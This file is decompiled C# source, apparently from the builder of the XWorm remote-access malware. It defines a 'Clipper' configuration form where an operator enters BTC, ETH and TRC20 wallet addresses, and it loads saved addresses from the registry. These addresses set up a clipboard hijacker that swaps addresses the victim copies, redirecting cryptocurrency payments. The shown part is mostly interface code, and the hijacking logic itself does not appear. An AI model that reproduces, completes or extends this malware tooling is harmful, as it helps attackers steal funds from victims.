#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;

namespace XWorm;

[DesignerGenerated]
public class Clipper : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[field: AccessedThroughProperty("Label1")]
	public Label Label1
	;

	[field: AccessedThroughProperty("Label2")]
	public Label Label2
	;

	[field: AccessedThroughProperty("Label3")]
	public Label Label3
	;

	[field: AccessedThroughProperty("Guna2TextBox3")]
	public Guna2TextBox Guna2TextBox3
	;

	public Guna2GradientButton Guna2GradientButton1
	;

	[field: AccessedThroughProperty("Guna2TextBox2")]
	public Guna2TextBox Guna2TextBox2
	;

	[field: AccessedThroughProperty("Guna2TextBox1")]
	public Guna2TextBox Guna2TextBox1
	;


	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Clipper));
		this.Label1 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2TextBox3 = new Guna.UI2.WinForms.Guna2TextBox();
		base.SuspendLayout();
		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Label1.AutoSize = true;
		this.Label1.ForeColor = System.Drawing.Color.Black;
		this.Label1.Location = new System.Drawing.Point(24, 17);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(33, 13);
		this.Label1.TabIndex = 0;
		this.Label1.Text = "BTC :";
		this.Label2.AutoSize = true;
		this.Label2.ForeColor = System.Drawing.Color.Black;
		this.Label2.Location = new System.Drawing.Point(24, 45);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(33, 13);
		this.Label2.TabIndex = 1;
		this.Label2.Text = "ETH :";
		this.Label3.AutoSize = true;
		this.Label3.ForeColor = System.Drawing.Color.Black;
		this.Label3.Location = new System.Drawing.Point(11, 71);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(46, 13);
		this.Label3.TabIndex = 2;
		this.Label3.Text = "TRC20 :";
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton1.Image");
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(63, 95);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(259, 27);
		this.Guna2GradientButton1.TabIndex = 55;
		this.Guna2GradientButton1.Text = "Ok";
		this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox2.BorderRadius = 3;
		this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox2.DefaultText = "ETH_Address";
		this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Location = new System.Drawing.Point(63, 41);
		this.Guna2TextBox2.Name = "Guna2TextBox2";
		this.Guna2TextBox2.PasswordChar = '\0';
		this.Guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.PlaceholderText = "";
		this.Guna2TextBox2.SelectedText = "";
		this.Guna2TextBox2.Size = new System.Drawing.Size(259, 21);
		this.Guna2TextBox2.TabIndex = 53;
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.BorderRadius = 3;
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "BTC_Address";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Location = new System.Drawing.Point(63, 14);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(259, 21);
		this.Guna2TextBox1.TabIndex = 54;
		this.Guna2TextBox3.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox3.BorderRadius = 3;
		this.Guna2TextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox3.DefaultText = "TRC20_Address";
		this.Guna2TextBox3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox3.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox3.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Location = new System.Drawing.Point(63, 68);
		this.Guna2TextBox3.Name = "Guna2TextBox3";
		this.Guna2TextBox3.PasswordChar = '\0';
		this.Guna2TextBox3.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.PlaceholderText = "";
		this.Guna2TextBox3.SelectedText = "";
		this.Guna2TextBox3.Size = new System.Drawing.Size(259, 21);
		this.Guna2TextBox3.TabIndex = 56;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(339, 141);
		base.Controls.Add(this.Guna2TextBox3);
		base.Controls.Add(this.Guna2GradientButton1);
		base.Controls.Add(this.Guna2TextBox2);
		base.Controls.Add(this.Guna2TextBox1);
		base.Controls.Add(this.Label3);
		base.Controls.Add(this.Label2);
		base.Controls.Add(this.Label1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Clipper";
		base.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
		this.Text = "Clipper";
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	public Clipper()
	{
		base.Load += Clipper_Load;
		InitializeComponent();
		base.Opacity = 0.0;
		Module0.smethod_18(this, 20);
		Guna2TextBox1.Select();
	}

	private void Clipper_Load(object sender, EventArgs e)
	{
		try
		{
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "BTC", null), null, TextCompare: false))))
			{
				Guna2TextBox1.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "BTC", null));
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "ETH", null), null, TextCompare: false))))
			{
				Guna2TextBox2.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "ETH", null));
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "TRC20", null), null, TextCompare: false))))
			{
				Guna2TextBox3.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "TRC20", null));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		if (!(string.IsNullOrWhiteSpace(Guna2TextBox1.Text) | string.IsNullOrWhiteSpace(Guna2TextBox2.Text) | string.IsNullOrWhiteSpace(Guna2TextBox3.Text)))
		{
			base.DialogResult = DialogResult.OK;
		}
	}
}